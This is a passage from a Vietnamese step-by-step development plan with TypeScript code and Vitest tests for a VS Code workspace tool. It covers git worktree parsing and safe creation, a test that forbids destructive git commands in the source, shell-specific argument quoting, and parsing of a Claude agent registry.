export async function writeManifest(projectRoot: string, manifest: Manifest): Promise<void> {
  const dir = manifestDir(projectRoot);
  await fs.mkdir(dir, { recursive: true });
  await fs.writeFile(manifestFilePath(projectRoot), stringifyYaml(manifest), 'utf8');
  await fs.writeFile(
    `${dir}/.gitignore`,
    '# Trạng thái chạy, không commit\nstate.json\n',
    'utf8',
  );
}

export async function readState(projectRoot: string): Promise<WorkspaceState> {
  try {
    const raw = await fs.readFile(stateFilePath(projectRoot), 'utf8');
    const parsed = StateSchema.safeParse(JSON.parse(raw));
    return parsed.success ? parsed.data : EMPTY_STATE;
  } catch {
    return EMPTY_STATE;
  }
}

export async function writeState(projectRoot: string, state: WorkspaceState): Promise<void> {
  await fs.mkdir(manifestDir(projectRoot), { recursive: true });
  await fs.writeFile(stateFilePath(projectRoot), `${JSON.stringify(state, null, 2)}\n`, 'utf8');
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/manifest-store.test.ts`
Expected: 8 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/manifest/store.ts test/unit/manifest-store.test.ts
git commit -m "feat(manifest): đọc/ghi workspace.yaml và state.json

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 6: Parse `git worktree list --porcelain`

**Files:**
- Modify: `src/git/porcelain.ts` (thay placeholder)
- Test: `test/unit/git-porcelain.test.ts`

**Interfaces:**
- Produces:
  - `interface WorktreeEntry { path: string; head: string | null; branch: string | null; detached: boolean; bare: boolean; }`
  - `parseWorktreeList(stdout: string): WorktreeEntry[]`
  - `shortBranch(ref: string | null): string | null` — đổi `refs/heads/feature/x` thành `feature/x`

- [ ] **Step 1: Viết test**

Tạo `test/unit/git-porcelain.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { parseWorktreeList, shortBranch } from '../../src/git/porcelain';

const SAMPLE = [
  'worktree /projects/erp',
  'HEAD abc1230000000000000000000000000000000000',
  'branch refs/heads/main',
  '',
  'worktree /projects/erp-production',
  'HEAD def4560000000000000000000000000000000000',
  'branch refs/heads/feature/production',
  '',
  'worktree /projects/erp-detached',
  'HEAD 789abc0000000000000000000000000000000000',
  'detached',
  '',
].join('\n');

describe('parseWorktreeList', () => {
  it('đọc được nhiều worktree', () => {
    const entries = parseWorktreeList(SAMPLE);
    expect(entries).toHaveLength(3);
    expect(entries[0]!.path).toBe('/projects/erp');
    expect(entries[0]!.branch).toBe('refs/heads/main');
    expect(entries[0]!.detached).toBe(false);
  });

  it('nhận diện detached HEAD', () => {
    const entries = parseWorktreeList(SAMPLE);
    expect(entries[2]!.detached).toBe(true);
    expect(entries[2]!.branch).toBeNull();
  });

  it('nhận diện bare repository', () => {
    const entries = parseWorktreeList('worktree /repo.git\nbare\n\n');
    expect(entries[0]!.bare).toBe(true);
  });

  it('trả mảng rỗng với chuỗi rỗng', () => {
    expect(parseWorktreeList('')).toEqual([]);
    expect(parseWorktreeList('\n\n')).toEqual([]);
  });

  it('chịu được khối cuối không có dòng trắng kết thúc', () => {
    const entries = parseWorktreeList('worktree /a\nHEAD abc\nbranch refs/heads/x');
    expect(entries).toHaveLength(1);
    expect(entries[0]!.branch).toBe('refs/heads/x');
  });

  it('chịu được đường dẫn Windows có khoảng trắng', () => {
    const entries = parseWorktreeList('worktree D:\\My Projects\\erp\nHEAD abc\nbranch refs/heads/main\n');
    expect(entries[0]!.path).toBe('D:\\My Projects\\erp');
  });
});

describe('shortBranch', () => {
  it('cắt tiền tố refs/heads/', () => {
    expect(shortBranch('refs/heads/feature/order-api')).toBe('feature/order-api');
  });
  it('giữ nguyên chuỗi không có tiền tố', () => {
    expect(shortBranch('main')).toBe('main');
  });
  it('trả null với null', () => {
    expect(shortBranch(null)).toBeNull();
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/git-porcelain.test.ts`
Expected: FAIL — `parseWorktreeList` không tồn tại.

- [ ] **Step 3: Cài đặt**

Thay toàn bộ `src/git/porcelain.ts`:

```ts
export interface WorktreeEntry {
  path: string;
  head: string | null;
  branch: string | null;
  detached: boolean;
  bare: boolean;
}

export function parseWorktreeList(stdout: string): WorktreeEntry[] {
  const entries: WorktreeEntry[] = [];
  let current: WorktreeEntry | null = null;

  const flush = (): void => {
    if (current) entries.push(current);
    current = null;
  };

  for (const line of stdout.split(/\r?\n/)) {
    if (line.trim() === '') { flush(); continue; }

    const space = line.indexOf(' ');
    const key = space === -1 ? line : line.slice(0, space);
    const value = space === -1 ? '' : line.slice(space + 1);

    switch (key) {
      case 'worktree':
        flush();
        current = { path: value, head: null, branch: null, detached: false, bare: false };
        break;
      case 'HEAD': if (current) current.head = value; break;
      case 'branch': if (current) current.branch = value; break;
      case 'detached': if (current) current.detached = true; break;
      case 'bare': if (current) current.bare = true; break;
      default: break;
    }
  }
  flush();
  return entries;
}

export function shortBranch(ref: string | null): string | null {
  if (ref === null) return null;
  return ref.startsWith('refs/heads/') ? ref.slice('refs/heads/'.length) : ref;
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/git-porcelain.test.ts`
Expected: 9 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/git/porcelain.ts test/unit/git-porcelain.test.ts
git commit -m "feat(git): parse git worktree list --porcelain

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 7: Phân loại worktree + lệnh git an toàn

**Files:**
- Create: `src/git/worktree.ts`
- Create: `src/git/exec.ts`
- Test: `test/unit/git-worktree.test.ts`
- Test: `test/unit/git-safety.test.ts`
- Test: `test/integration/git.test.ts`

**Interfaces:**
- Consumes: `WorktreeEntry`, `parseWorktreeList`, `shortBranch` (Task 6)
- Produces:
  - `type WorktreeStatus` — union 4 nhánh: `{kind:'ok'}`, `{kind:'missing'}`, `{kind:'branch-mismatch', actual: string|null}`, `{kind:'not-registered'}`; nhánh nào cũng có `path: string` và `expectedBranch: string`
  - `classifyWorktree(args: { expectedPath: string; expectedBranch: string; entries: WorktreeEntry[]; pathExists: boolean }): WorktreeStatus`
  - `buildAddWorktreeArgs(absPath: string, branch: string, branchExists: boolean): string[]`
  - `interface GitRunner { run(cwd: string, args: string[]): Promise<{ stdout: string; stderr: string; code: number }> }`
  - `class GitClient` với `listWorktrees(repoRoot)`, `isRepo(dir)`, `branchExists(repoRoot, branch)`, `addWorktree(repoRoot, absPath, branch)`

- [ ] **Step 1: Viết test cho `classifyWorktree`**

Tạo `test/unit/git-worktree.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { classifyWorktree, buildAddWorktreeArgs } from '../../src/git/worktree';
import type { WorktreeEntry } from '../../src/git/porcelain';

const entry = (path: string, branch: string | null): WorktreeEntry =>
  ({ path, head: 'abc', branch, detached: branch === null, bare: false });

describe('classifyWorktree', () => {
  const entries = [
    entry('/projects/erp', 'refs/heads/main'),
    entry('/projects/erp-prod', 'refs/heads/feature/production'),
  ];

  it('ok khi thư mục tồn tại, đã đăng ký và đúng branch', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/erp-prod', expectedBranch: 'feature/production',
      entries, pathExists: true,
    });
    expect(r.kind).toBe('ok');
  });

  it('missing khi thư mục không tồn tại', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/erp-qc', expectedBranch: 'feature/qc',
      entries, pathExists: false,
    });
    expect(r.kind).toBe('missing');
    expect(r.expectedBranch).toBe('feature/qc');
  });

  it('not-registered khi thư mục có nhưng git không biết', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/erp-qc', expectedBranch: 'feature/qc',
      entries, pathExists: true,
    });
    expect(r.kind).toBe('not-registered');
  });

  it('branch-mismatch khi đã đăng ký nhưng branch khác', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/erp-prod', expectedBranch: 'feature/other',
      entries, pathExists: true,
    });
    expect(r.kind).toBe('branch-mismatch');
    if (r.kind === 'branch-mismatch') expect(r.actual).toBe('feature/production');
  });

  it('branch-mismatch với detached HEAD, actual là null', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/det', expectedBranch: 'main',
      entries: [entry('/projects/det', null)], pathExists: true,
    });
    expect(r.kind).toBe('branch-mismatch');
    if (r.kind === 'branch-mismatch') expect(r.actual).toBeNull();
  });

  it('so sánh đường dẫn không phân biệt dấu gạch chéo và dấu chéo cuối', () => {
    const r = classifyWorktree({
      expectedPath: '/projects/erp-prod/', expectedBranch: 'feature/production',
      entries, pathExists: true,
    });
    expect(r.kind).toBe('ok');
  });
});

describe('buildAddWorktreeArgs', () => {
  it('dùng branch có sẵn khi branch đã tồn tại', () => {
    expect(buildAddWorktreeArgs('/projects/erp-qc', 'feature/qc', true))
      .toEqual(['worktree', 'add', '/projects/erp-qc', 'feature/qc']);
  });

  it('tạo branch mới bằng -b khi branch chưa tồn tại', () => {
    expect(buildAddWorktreeArgs('/projects/erp-qc', 'feature/qc', false))
      .toEqual(['worktree', 'add', '-b', 'feature/qc', '/projects/erp-qc']);
  });

  it('không bao giờ sinh cờ --force', () => {
    const args = buildAddWorktreeArgs('/p', 'b', true).concat(buildAddWorktreeArgs('/p', 'b', false));
    expect(args).not.toContain('--force');
    expect(args).not.toContain('-f');
  });
});
```

- [ ] **Step 2: Viết test hàng rào an toàn**

Tạo `test/unit/git-safety.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { join } from 'node:path';

const BANNED = [
  'reset', 'clean', 'checkout', 'stash', 'rebase', 'merge',
  'worktree remove', 'worktree prune', 'branch -d', 'branch -D', 'push --force',
];

function walk(dir: string): string[] {
  const out: string[] = [];
  for (const e of readdirSync(dir)) {
    const full = join(dir, e);
    if (statSync(full).isDirectory()) out.push(...walk(full));
    else if (full.endsWith('.ts')) out.push(full);
  }
  return out;
}

describe('an toàn git', () => {
  it('mã nguồn không chứa lệnh git phá trạng thái', () => {
    const offenders: string[] = [];
    for (const file of walk('src')) {
      const src = readFileSync(file, 'utf8');
      for (const banned of BANNED) {
        if (src.includes(`'${banned}'`) || src.includes(`"${banned}"`)) {
          offenders.push(`${file}: ${banned}`);
        }
      }
    }
    expect(offenders).toEqual([]);
  });
});
```

- [ ] **Step 3: Chạy hai test, xác nhận FAIL**

Run: `npx vitest run test/unit/git-worktree.test.ts test/unit/git-safety.test.ts`
Expected: `git-worktree.test.ts` FAIL (module không tồn tại); `git-safety.test.ts` PASS (chưa có mã vi phạm) — vẫn giữ nó để chặn hồi quy.

- [ ] **Step 4: Cài đặt `src/git/exec.ts`**

```ts
import { execFile } from 'node:child_process';

export interface GitResult { stdout: string; stderr: string; code: number }

export interface GitRunner {
  run(cwd: string, args: string[]): Promise<GitResult>;
}

export const realGitRunner: GitRunner = {
  run(cwd, args) {
    return new Promise((resolve) => {
      execFile('git', args, { cwd, encoding: 'utf8', windowsHide: true }, (error, stdout, stderr) => {
        const code = error && typeof (error as { code?: number }).code === 'number'
          ? (error as { code: number }).code
          : error ? 1 : 0;
        resolve({ stdout, stderr, code });
      });
    });
  },
};
```

- [ ] **Step 5: Cài đặt `src/git/worktree.ts`**

```ts
import * as path from 'node:path';
import { parseWorktreeList, shortBranch, type WorktreeEntry } from './porcelain';
import type { GitRunner } from './exec';

interface Common { path: string; expectedBranch: string }

export type WorktreeStatus =
  | (Common & { kind: 'ok' })
  | (Common & { kind: 'missing' })
  | (Common & { kind: 'not-registered' })
  | (Common & { kind: 'branch-mismatch'; actual: string | null });

function samePath(a: string, b: string): boolean {
  const norm = (p: string): string => path.resolve(p).replace(/[\\/]+$/, '').toLowerCase();
  return norm(a) === norm(b);
}

export function classifyWorktree(args: {
  expectedPath: string;
  expectedBranch: string;
  entries: WorktreeEntry[];
  pathExists: boolean;
}): WorktreeStatus {
  const common: Common = { path: args.expectedPath, expectedBranch: args.expectedBranch };
  if (!args.pathExists) return { ...common, kind: 'missing' };

  const entry = args.entries.find((e) => samePath(e.path, args.expectedPath));
  if (!entry) return { ...common, kind: 'not-registered' };

  const actual = shortBranch(entry.branch);
  if (actual !== args.expectedBranch) return { ...common, kind: 'branch-mismatch', actual };
  return { ...common, kind: 'ok' };
}

export function buildAddWorktreeArgs(absPath: string, branch: string, branchExists: boolean): string[] {
  return branchExists
    ? ['worktree', 'add', absPath, branch]
    : ['worktree', 'add', '-b', branch, absPath];
}

export class GitClient {
  constructor(private readonly runner: GitRunner) {}

  async isRepo(dir: string): Promise<boolean> {
    const r = await this.runner.run(dir, ['rev-parse', '--git-dir']);
    return r.code === 0;
  }

  async listWorktrees(repoRoot: string): Promise<WorktreeEntry[]> {
    const r = await this.runner.run(repoRoot, ['worktree', 'list', '--porcelain']);
    if (r.code !== 0) throw new Error(`git worktree list thất bại: ${r.stderr.trim()}`);
    return parseWorktreeList(r.stdout);
  }

  async branchExists(repoRoot: string, branch: string): Promise<boolean> {
    const r = await this.runner.run(repoRoot, ['rev-parse', '--verify', '--quiet', `refs/heads/${branch}`]);
    return r.code === 0;
  }

  /** Chỉ TẠO. Không bao giờ gỡ, dọn hay ghi đè worktree đang có. */
  async addWorktree(repoRoot: string, absPath: string, branch: string): Promise<void> {
    const exists = await this.branchExists(repoRoot, branch);
    const args = buildAddWorktreeArgs(absPath, branch, exists);
    const r = await this.runner.run(repoRoot, args);
    if (r.code !== 0) throw new Error(`git ${args.join(' ')} thất bại: ${r.stderr.trim()}`);
  }
}
```

- [ ] **Step 6: Chạy test unit, xác nhận PASS**

Run: `npx vitest run test/unit/git-worktree.test.ts test/unit/git-safety.test.ts`
Expected: 10 test PASS.

Sau đó bổ sung thêm nhóm test `GitClient với runner giả` vào cuối `test/unit/git-worktree.test.ts` — dùng `GitRunner` giả tự viết trong file test (không thư viện mock, không đụng đĩa/git thật) để phủ các nhánh mà integration test (chỉ chạy trên git thật, luôn trả kết quả hợp lệ) không bao giờ chạm tới: `isRepo` true/false theo exit code, `listWorktrees` trả về danh sách đã parse khi code 0 và NÉM lỗi có chứa `stderr` khi code khác 0, `branchExists` true/false theo exit code, và quan trọng nhất — `addWorktree` phải gọi runner với đúng mảng args mà `buildAddWorktreeArgs` sinh ra (ghi lại lời gọi trong runner giả rồi assert trên đó) cho cả hai trường hợp branch đã tồn tại / chưa tồn tại, cùng với việc NÉM lỗi khi runner trả code khác 0.

```ts
// Thêm vào đầu file, cạnh các import khác:
import { GitClient } from '../../src/git/worktree';
import type { GitRunner, GitResult } from '../../src/git/exec';

// Thêm vào cuối file, sau describe('buildAddWorktreeArgs', ...):

/** Runner giả: không gọi git thật, không đụng đĩa. Ghi lại mọi lời gọi để assert. */
function fakeRunner(results: GitResult[]): GitRunner & { calls: string[][] } {
  const queue = [...results];
  const calls: string[][] = [];
  return {
    calls,
    async run(_cwd: string, args: string[]): Promise<GitResult> {
      calls.push(args);
      return queue.shift() ?? { stdout: '', stderr: '', code: 0 };
    },
  };
}

describe('GitClient với runner giả', () => {
  it('isRepo trả true khi runner trả code 0', async () => {
    const runner = fakeRunner([{ stdout: '.git', stderr: '', code: 0 }]);
    const client = new GitClient(runner);
    expect(await client.isRepo('/repo')).toBe(true);
    expect(runner.calls).toEqual([['rev-parse', '--git-dir']]);
  });

  it('isRepo trả false khi runner trả code khác 0', async () => {
    const runner = fakeRunner([{ stdout: '', stderr: 'not a git repository', code: 128 }]);
    const client = new GitClient(runner);
    expect(await client.isRepo('/khong-phai-repo')).toBe(false);
  });

  it('listWorktrees trả về danh sách đã parse khi code 0', async () => {
    const stdout = 'worktree /projects/erp\nHEAD abc\nbranch refs/heads/main\n';
    const runner = fakeRunner([{ stdout, stderr: '', code: 0 }]);
    const client = new GitClient(runner);
    const entries = await client.listWorktrees('/projects/erp');
    expect(entries).toEqual([
      { path: '/projects/erp', head: 'abc', branch: 'refs/heads/main', detached: false, bare: false },
    ]);
  });

  it('listWorktrees ném lỗi chứa stderr khi runner trả code khác 0', async () => {
    const runner = fakeRunner([{ stdout: '', stderr: 'fatal: không phải repo git', code: 1 }]);
    const client = new GitClient(runner);
    await expect(client.listWorktrees('/repo')).rejects.toThrow(/không phải repo git/);
  });

  it('branchExists trả true/false theo exit code', async () => {
    const runnerTrue = fakeRunner([{ stdout: 'abc123', stderr: '', code: 0 }]);
    expect(await new GitClient(runnerTrue).branchExists('/repo', 'main')).toBe(true);

    const runnerFalse = fakeRunner([{ stdout: '', stderr: '', code: 1 }]);
    expect(await new GitClient(runnerFalse).branchExists('/repo', 'khong-ton-tai')).toBe(false);
  });

  it('addWorktree dùng buildAddWorktreeArgs khi branch đã tồn tại', async () => {
    const runner = fakeRunner([
      { stdout: 'abc123', stderr: '', code: 0 }, // branchExists -> true
      { stdout: '', stderr: '', code: 0 }, // worktree add
    ]);
    const client = new GitClient(runner);
    await client.addWorktree('/repo', '/projects/erp-qc', 'feature/qc');
    expect(runner.calls[1]).toEqual(['worktree', 'add', '/projects/erp-qc', 'feature/qc']);
  });

  it('addWorktree dùng buildAddWorktreeArgs khi branch chưa tồn tại', async () => {
    const runner = fakeRunner([
      { stdout: '', stderr: '', code: 1 }, // branchExists -> false
      { stdout: '', stderr: '', code: 0 }, // worktree add -b
    ]);
    const client = new GitClient(runner);
    await client.addWorktree('/repo', '/projects/erp-qc', 'feature/qc');
    expect(runner.calls[1]).toEqual(['worktree', 'add', '-b', 'feature/qc', '/projects/erp-qc']);
  });

  it('addWorktree ném lỗi khi runner trả code khác 0', async () => {
    const runner = fakeRunner([
      { stdout: '', stderr: '', code: 1 }, // branchExists -> false
      { stdout: '', stderr: 'fatal: đường dẫn đã tồn tại', code: 128 }, // worktree add thất bại
    ]);
    const client = new GitClient(runner);
    await expect(client.addWorktree('/repo', '/projects/erp-qc', 'feature/qc')).rejects.toThrow(/thất bại/);
  });
});
```

Run lại: `npx vitest run test/unit/git-worktree.test.ts test/unit/git-safety.test.ts`
Expected: 18 test PASS (9 test `classifyWorktree`/`buildAddWorktreeArgs` + 8 test `GitClient` với runner giả + 1 test an toàn).

- [ ] **Step 7: Viết test integration với git thật**

Tạo `test/integration/git.test.ts`. Lưu ý: các worktree được tạo là THƯ MỤC ANH EM của `root` (`join(root, '..', 'wt*-<timestamp>')`), không phải con của nó, nên việc dọn dẹp KHÔNG được đặt ở cuối thân từng test — nếu một assert phía trên ném lỗi, dòng dọn dẹp phía dưới sẽ không bao giờ chạy và thư mục worktree rò rỉ vĩnh viễn trong temp dir của máy. Thay vào đó, mỗi test đẩy đường dẫn worktree nó tạo vào mảng `worktreesToClean` ở scope `describe` NGAY SAU khi tạo, và `afterEach` — chạy bất kể test đỏ hay xanh — duyệt mảng đó để dọn, cộng với dọn `root`:

```ts
import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, existsSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { GitClient } from '../../src/git/worktree';
import { realGitRunner } from '../../src/git/exec';
import { classifyWorktree } from '../../src/git/worktree';

let root: string;
const git = new GitClient(realGitRunner);
// Worktree được tạo là THƯ MỤC ANH EM của `root` (nằm ngoài root), nên phải
// tự đăng ký đường dẫn ở đây để afterEach dọn dẹp — kể cả khi test đỏ giữa chừng
// và không bao giờ chạy tới dòng rmSync ở cuối thân test.
let worktreesToClean: string[] = [];

beforeEach(async () => {
  root = mkdtempSync(join(tmpdir(), 'wss-git-'));
  worktreesToClean = [];
  await realGitRunner.run(root, ['init', '-b', 'main']);
  await realGitRunner.run(root, ['config', 'user.email', 'test@example.com']);
  await realGitRunner.run(root, ['config', 'user.name', 'Test']);
  writeFileSync(join(root, 'README.md'), '# test\n');
  await realGitRunner.run(root, ['add', '.']);
  await realGitRunner.run(root, ['commit', '-m', 'init']);
});
afterEach(() => {
  for (const wt of worktreesToClean) rmSync(wt, { recursive: true, force: true });
  rmSync(root, { recursive: true, force: true });
});

describe('GitClient trên repo thật', () => {
  it('isRepo phân biệt được repo và thư mục thường', async () => {
    expect(await git.isRepo(root)).toBe(true);
    const plain = mkdtempSync(join(tmpdir(), 'wss-plain-'));
    expect(await git.isRepo(plain)).toBe(false);
    rmSync(plain, { recursive: true, force: true });
  });

  it('listWorktrees thấy worktree gốc', async () => {
    const entries = await git.listWorktrees(root);
    expect(entries).toHaveLength(1);
    expect(entries[0]!.branch).toBe('refs/heads/main');
  });

  it('addWorktree tạo branch mới khi branch chưa có', async () => {
    const wt = join(root, '..', `wt-${Date.now()}`);
    worktreesToClean.push(wt);
    await git.addWorktree(root, wt, 'feature/qc');
    expect(existsSync(wt)).toBe(true);
    const entries = await git.listWorktrees(root);
    const status = classifyWorktree({
      expectedPath: wt, expectedBranch: 'feature/qc', entries, pathExists: true,
    });
    expect(status.kind).toBe('ok');
  });

  it('addWorktree dùng lại branch đã tồn tại', async () => {
    await realGitRunner.run(root, ['branch', 'feature/existing']);
    const wt = join(root, '..', `wt2-${Date.now()}`);
    worktreesToClean.push(wt);
    await git.addWorktree(root, wt, 'feature/existing');
    const entries = await git.listWorktrees(root);
    expect(entries.some((e) => e.branch === 'refs/heads/feature/existing')).toBe(true);
  });

  it('addWorktree ném lỗi rõ ràng khi đường dẫn đã bị chiếm', async () => {
    const wt = join(root, '..', `wt3-${Date.now()}`);
    worktreesToClean.push(wt);
    await git.addWorktree(root, wt, 'feature/a');
    await expect(git.addWorktree(root, wt, 'feature/b')).rejects.toThrow(/thất bại/);
  });
});
```

- [ ] **Step 8: Chạy test integration, xác nhận PASS**

Run: `npx vitest run test/integration/git.test.ts`
Expected: 5 test PASS. Nếu máy chưa có `git` trong PATH thì test này fail — đó là kỳ vọng đúng, git là yêu cầu bắt buộc.

- [ ] **Step 9: Commit**

```bash
git add src/git test/unit/git-worktree.test.ts test/unit/git-safety.test.ts test/integration/git.test.ts
git commit -m "feat(git): phân loại worktree và tạo worktree an toàn

Chỉ tạo, không bao giờ gỡ/dọn/ghi đè. Có test chặn mọi lệnh git phá trạng thái.

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 8: Quoting theo shell

**Files:**
- Create: `src/agent/quote.ts`
- Test: `test/unit/agent-quote.test.ts`

**Interfaces:**
- Produces:
  - `type ShellKind = 'powershell' | 'posix' | 'cmd'`
  - `quoteArg(value: string, shell: ShellKind): string`
  - `detectShellKind(platform: NodeJS.Platform, shellPath: string | undefined): ShellKind`

Kết quả spike Task 1 Step 3 quyết định chi tiết; test dưới đây khớp với hành vi chuẩn của từng shell.

- [ ] **Step 1: Viết test**

Tạo `test/unit/agent-quote.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { quoteArg, detectShellKind } from '../../src/agent/quote';

describe('quoteArg powershell', () => {
  it('bọc nháy đơn', () => {
    expect(quoteArg('Coordinator', 'powershell')).toBe("'Coordinator'");
  });
  it('giữ nguyên khoảng trắng và tiếng Việt', () => {
    expect(quoteArg('Tên có dấu', 'powershell')).toBe("'Tên có dấu'");
  });
  it('nhân đôi nháy đơn bên trong', () => {
    expect(quoteArg("it's", 'powershell')).toBe("'it''s'");
  });
  it('không diễn giải $ vì nháy đơn PowerShell là literal', () => {
    expect(quoteArg('$env:PATH', 'powershell')).toBe("'$env:PATH'");
  });
});

describe('quoteArg posix', () => {
  it('bọc nháy đơn', () => {
    expect(quoteArg('Coordinator', 'posix')).toBe("'Coordinator'");
  });
  it('thoát nháy đơn bên trong theo kiểu posix', () => {
    expect(quoteArg("it's", 'posix')).toBe("'it'\\''s'");
  });
  it('không diễn giải $', () => {
    expect(quoteArg('$HOME', 'posix')).toBe("'$HOME'");
  });
});

describe('quoteArg cmd', () => {
  it('bọc nháy kép', () => {
    expect(quoteArg('Coordinator', 'cmd')).toBe('"Coordinator"');
  });
  it('bỏ ký tự nháy kép vì cmd không thoát được an toàn', () => {
    expect(quoteArg('a"b', 'cmd')).toBe('"ab"');
  });
});

describe('detectShellKind', () => {
  it('mặc định powershell trên windows', () => {
    expect(detectShellKind('win32', undefined)).toBe('powershell');
  });
  it('nhận diện pwsh theo đường dẫn', () => {
    expect(detectShellKind('win32', 'C:\\Program Files\\PowerShell\\7\\pwsh.exe')).toBe('powershell');
  });
  it('nhận diện sh.exe (Git for Windows) là posix', () => {
    expect(detectShellKind('win32', 'C:\\Program Files\\Git\\usr\\bin\\sh.exe')).toBe('posix');
  });
  it('nhận diện cmd.exe', () => {
    expect(detectShellKind('win32', 'C:\\Windows\\System32\\cmd.exe')).toBe('cmd');
  });
  it('nhận diện git bash trên windows là posix', () => {
    expect(detectShellKind('win32', 'C:\\Program Files\\Git\\bin\\bash.exe')).toBe('posix');
  });
  it('mặc định posix trên linux và darwin', () => {
    expect(detectShellKind('linux', undefined)).toBe('posix');
    expect(detectShellKind('darwin', '/bin/zsh')).toBe('posix');
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/agent-quote.test.ts`
Expected: FAIL — module không tồn tại.

- [ ] **Step 3: Cài đặt**

Tạo `src/agent/quote.ts`:

```ts
export type ShellKind = 'powershell' | 'posix' | 'cmd';

export function quoteArg(value: string, shell: ShellKind): string {
  switch (shell) {
    case 'powershell':
      return `'${value.replace(/'/g, "''")}'`;
    case 'posix':
      return `'${value.replace(/'/g, "'\\''")}'`;
    case 'cmd':
      return `"${value.replace(/"/g, '')}"`;
  }
}

export function detectShellKind(platform: NodeJS.Platform, shellPath: string | undefined): ShellKind {
  if (platform !== 'win32') return 'posix';
  const lower = (shellPath ?? '').toLowerCase();
  if (lower.includes('cmd.exe')) return 'cmd';
  // Phải kiểm PowerShell TRƯỚC nhánh POSIX: chuỗi 'pwsh.exe' có chứa 'sh.exe'.
  if (lower.includes('pwsh') || lower.includes('powershell')) return 'powershell';
  // 'sh.exe' chỉ tính khi đứng ngay sau dấu phân cách và ở cuối đường dẫn,
  // để không bắt nhầm những tên kết thúc bằng 'sh.exe' như 'pwsh.exe'.
  if (lower.includes('bash') || lower.includes('wsl') || /[\\/]sh\.exe$/.test(lower)) return 'posix';
  return 'powershell';
}
```

- [ ] **Step 4: Chạy test, xác nhận PASS**

Run: `npx vitest run test/unit/agent-quote.test.ts`
Expected: 15 test PASS.

- [ ] **Step 5: Commit**

```bash
git add src/agent/quote.ts test/unit/agent-quote.test.ts
git commit -m "feat(agent): quoting tham số theo từng loại shell

Co-Authored-By: Claude Opus 5 (1M context) <noreply@anthropic.com>"
```

---

### Task 9: Parse registry `claude agents --json`

**Files:**
- Modify: `src/agent/types.ts` (thay placeholder)
- Create: `src/agent/registry.ts`
- Test: `test/unit/agent-registry.test.ts`

**Interfaces:**
- Produces:
  - `interface RunningSession { sessionId: string; name: string | null; cwd: string; pid: number | null; kind: 'interactive' | 'background'; status: 'busy' | 'idle' | 'blocked' }`
  - `parseAgentsJson(stdout: string): RunningSession[]`
  - `uniqueSessionName(desired: string, taken: ReadonlySet<string>): string`

Dữ liệu mẫu lấy từ output thật đã quan sát: bản ghi `interactive` có trường `status`, bản ghi `background` có trường `state` và không có `pid`.

- [ ] **Step 1: Viết test**

Tạo `test/unit/agent-registry.test.ts`:

```ts
import { describe, it, expect } from 'vitest';
import { parseAgentsJson, uniqueSessionName } from '../../src/agent/registry';

const REAL_OUTPUT = JSON.stringify([
  { id: '44027166', cwd: 'D:\\Coding\\3D Load Calculator', kind: 'background',
    startedAt: 1781664932079, sessionId: '44027166-59ba-4380-92ab-a496f8271b03',
    name: 'kubova-test-suite-automation', state: 'blocked' },
  { pid: 12028, cwd: 'D:\\Coding\\vscode-workspace-saver', kind: 'interactive',
    startedAt: 1786253359151, sessionId: '639a2ba8-e4f0-4e0b-917c-6ab773c8a922',
    name: 'vscode-workspace-saver-87', status: 'busy' },
]);

describe('parseAgentsJson', () => {
  it('đọc được cả bản ghi interactive lẫn background', () => {
    const sessions = parseAgentsJson(REAL_OUTPUT);
    expect(sessions).toHaveLength(2);
  });

  it('lấy status từ trường state với bản ghi background', () => {
    const bg = parseAgentsJson(REAL_OUTPUT)[0]!;
    expect(bg.kind).toBe('background');
    expect(bg.status).toBe('blocked');
    expect(bg.pid).toBeNull();
  });

  it('lấy status từ trường status với bản ghi interactive', () => {
    const it0 = parseAgentsJson(REAL_OUTPUT)[1]!;
    expect(it0.status).toBe('busy');
    expect(it0.pid).toBe(12028);
    expect(it0.cwd).toBe('D:\\Coding\\vscode-workspace-saver');
  });

  it('trả mảng rỗng khi output rỗng hoặc không phải JSON', () => {
    expect(parseAgentsJson('')).toEqual([]);
    expect(parseAgentsJson('claude: command not found')).toEqual([]);
  });

  it('trả mảng rỗng khi JSON hợp lệ nhưng không phải mảng', () => {
    expect(parseAgentsJson('{"a":1}')).toEqual([]);
  });

  it('bỏ qua bản ghi thiếu sessionId thay vì ném lỗi', () => {
    const out = JSON.stringify([{ cwd: '/a', kind: 'interactive', status: 'idle' }]);
    expect(parseAgentsJson(out)).toEqual([]);
  });

  it('quy status lạ về idle', () => {
    const out = JSON.stringify([
      { sessionId: '639a2ba8-e4f0-4e0b-917c-6ab773c8a922', cwd: '/a', kind: 'interactive', status: 'khong-ro' },
    ]);
    expect(parseAgentsJson(out)[0]!.status).toBe('idle');
  });
});

describe('uniqueSessionName', () => {
  it('giữ nguyên tên khi chưa bị chiếm', () => {
    expect(uniqueSessionName('Backend', new Set())).toBe('Backend');
  });
  it('thêm hậu tố -2 khi trùng', () => {
    expect(uniqueSessionName('Backend', new Set(['Backend']))).toBe('Backend-2');
  });
  it('tăng hậu tố tới khi hết trùng', () => {
    expect(uniqueSessionName('Backend', new Set(['Backend', 'Backend-2', 'Backend-3'])))
      .toBe('Backend-4');
  });
});
```

- [ ] **Step 2: Chạy test, xác nhận FAIL**

Run: `npx vitest run test/unit/agent-registry.test.ts`
Expected: FAIL — module không tồn tại.

